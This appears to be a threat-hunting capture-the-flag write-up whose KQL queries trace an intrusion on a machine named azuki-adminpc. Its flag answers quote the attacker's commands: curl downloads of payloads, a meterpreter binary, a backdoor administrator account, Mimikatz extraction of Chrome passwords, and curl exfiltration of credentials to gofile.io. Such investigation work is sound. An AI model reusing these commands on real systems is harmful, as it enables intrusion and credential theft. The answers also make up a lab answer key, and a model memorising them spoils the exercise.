```
//Flag 1 & Flag 2 & Flag 3
DeviceLogonEvents 
| where DeviceName contains "azuki"  
| where Timestamp between (datetime(2025-11-24) ..datetime(2025-11-26))
| where ActionType == "LogonSuccess"
| project Timestamp, DeviceName, ActionType, RemoteIP, AccountName, RemotePort
| sort by Timestamp desc 
// Flag 1 = 10.1.0.204
// Flag 2 = yuki.tanaka
// Flag 3 = azuki-adminpc
```

<img width="1241" height="108" alt="image" src="https://github.com/user-attachments/assets/7457e3a0-1ff9-418e-9f3b-83c1ed166b5c" />


```
//Flag 4
DeviceNetworkEvents
| where DeviceName contains "azuki"  
| where Timestamp between (datetime(2025-11-24) ..datetime(2025-11-26)) 
| where RemoteUrl contains "litter"
| sort by Timestamp asc 
// Flag 4 = litter.catbox.moe
```

<img width="1372" height="90" alt="image" src="https://github.com/user-attachments/assets/65bcd058-91c6-4cbc-a653-b394b6e41a99" />

```
// Flag 5 
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"  
| where Timestamp between (datetime(2025-11-24) ..datetime(2025-11-26))
| where ProcessCommandLine contains "Litter"
| project Timestamp, DeviceName, ProcessCommandLine
// Flag 5 = "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
```

<img width="1046" height="106" alt="image" src="https://github.com/user-attachments/assets/7933a66c-c60e-4aaa-90ac-03977ed4390a" />


```
// Flag 6 
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"  
| where Timestamp between (datetime(2025-11-24) ..datetime(2025-11-26))
| where ProcessCommandLine contains "KB5044273-x64.7z"
| project Timestamp, DeviceName, ProcessCommandLine
// Flag 6 = "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
```

<img width="1065" height="76" alt="image" src="https://github.com/user-attachments/assets/e00f1920-b41a-4db7-a3ce-b3b878645847" />


```
// Flag 7
DeviceFileEvents
| where DeviceName contains "azuki-adminpc"  
| where Timestamp between (datetime(2025-11-24) ..datetime(2025-11-26))
| where FolderPath contains "Temp" and FolderPath contains "cache" and FolderPath contains "Windows"
| where FileName contains ".exe"
// flag 7 = meterpreter.exe
```

<img width="1101" height="60" alt="image" src="https://github.com/user-attachments/assets/f23306d3-a383-4ca9-b19b-f9506b5da1ac" />


```
// flag 8 
DeviceEvents
| where DeviceName contains "azuki-adminpc"  
| where Timestamp between (datetime(2025-11-25T04:21:00Z) .. datetime(2025-11-25T05:00:00Z))
| where ActionType == "NamedPipeEvent"
| project Timestamp, AdditionalFields
// Flag 8 = \Device\NamedPipe\msf-pipe-5902
```

<img width="1598" height="56" alt="image" src="https://github.com/user-attachments/assets/4f1bf20e-d367-4d57-be7c-2cfca69475bb" />

```
// Flag 9 & Flag 10 & Flag 11
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"  
| where Timestamp between (datetime(2025-11-25T04:21:00Z) .. datetime(2025-11-26T05:00:00Z))
| where FileName contains "Powershell"
| project Timestamp, ProcessCommandLine
// Flag 9 = net user yuki.tanaka2 B@ckd00r2024! /add
// Flag 10 =  yuki.tanaka2
// Flag 11 = net localgroup Administrators yuki.tanaka2 /add
```

<img width="1476" height="70" alt="image" src="https://github.com/user-attachments/assets/85af2150-c228-40fb-96a7-84545fb1efff" />


```
// Flag 12
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-25T06:00:00Z))
| where ProcessCommandLine contains "qwinsta" or ProcessCommandLine contains "query session" or ProcessCommandLine contains "q session" or ProcessCommandLine contains "q user" or FileName in ("qwinsta.exe", "query.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
// Flag 12 = qwinsta.exe
```

<img width="1213" height="99" alt="image" src="https://github.com/user-attachments/assets/581f1f76-6914-4757-832c-219de1e7a7fe" />


```
// Flag 13
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-25T06:00:00Z))
| where DeviceName == "azuki-adminpc"
| where FileName == "nltest.exe" or ProcessCommandLine contains "nltest" and ProcessCommandLine contains "domain_trusts"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
// Flag 13 = "nltest.exe" /domain_trusts /all_trusts
```

<img width="1137" height="114" alt="image" src="https://github.com/user-attachments/assets/77f6e768-c2b0-4ee8-a909-af2959104adc" />


```
//Flag 14
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp > datetime(2025-11-25T04:00:00Z)
| where FileName == "netstat.exe" or ProcessCommandLine contains "netstat"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
// Flag 14 = "NETSTAT.EXE" -ano
```

<img width="1001" height="155" alt="image" src="https://github.com/user-attachments/assets/cba9063f-dfdc-4e55-bf48-1dfaf6b85cd8" />


```
// Flag 15
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp > datetime(2025-11-25T04:00:00Z)
//| where ProcessCommandLine contains "dir"// and ProcessCommandLine contains "/s" and ProcessCommandLine contains ".kdbx"
| where ProcessCommandLine contains ".kdbx"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
// Flag 15 = "cmd.exe" /c where /r C:\Users *.kdbx
```

<img width="1164" height="98" alt="image" src="https://github.com/user-attachments/assets/369bc540-88a6-4a4b-be63-afdf20bc538b" />


```
// Flag 16
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-25T08:00:00Z))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains ".txt"
| project Timestamp, ProcessCommandLine
// Flag 16 = OLD-Passwords.txt
```

```
// Flag 17
DeviceFileEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-25T08:00:00Z))
| where DeviceName == "azuki-adminpc"
| where ActionType == "FileCreated"
| where FolderPath contains "staging" or FolderPath contains "Crypto" or FolderPath contains "cache"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
// Flag 17 = C:\ProgramData\Microsoft\Crypto\staging
```

```
// Flag 18
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-25T08:00:00Z))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "Robocopy"
| project Timestamp,ProcessCommandLine
// Flag 18 = "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
```

```
// Flag 19
DeviceFileEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-25T08:00:00Z))
| where DeviceName == "azuki-adminpc"
| where FolderPath contains "Crypto"
| where FileName endswith ".zip" or FileName endswith ".tar.gz"
// Flag 19 = 8
```

```
// Flag 20
DeviceProcessEvents
| where Timestamp > datetime(2025-11-25T05:00:00Z)
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine contains "litter.catbox.moe" or ProcessCommandLine contains "curl" or ProcessCommandLine contains "Invoke-WebRequest" or FileName in ("curl.exe", "powershell.exe")
| project Timestamp, ProcessCommandLine, InitiatingProcessFileName
// Flag 20 = "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
```

```
// Flag 21
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-26T00:00:00Z))
| where DeviceName == "azuki-adminpc"
//| where FileName == "tar.exe"
| where ProcessCommandLine contains "chrome" 
| project Timestamp, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
// Flag 21 = "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
```

```
// Flag 22 & Flag 23
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-26T00:00:00Z))
| where DeviceName == "azuki-adminpc"
//| where FileName == "tar.exe"
| where ProcessCommandLine contains "POST" 
| project Timestamp, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
// Flag 22 = "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
// Flag 23 = gofile.io
```

```
// Flag 24
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-26T00:00:00Z))
| where DeviceName == "azuki-adminpc"
| where RemoteUrl contains "gofile"
// Flag 24 = 45.112.123.227
```

```
// Flag 25
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-25T04:00:00Z) .. datetime(2025-11-25T08:00:00Z))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains ".txt"
| project Timestamp, ProcessCommandLine
// Flag 25 = KeePass-Master-Password.txt
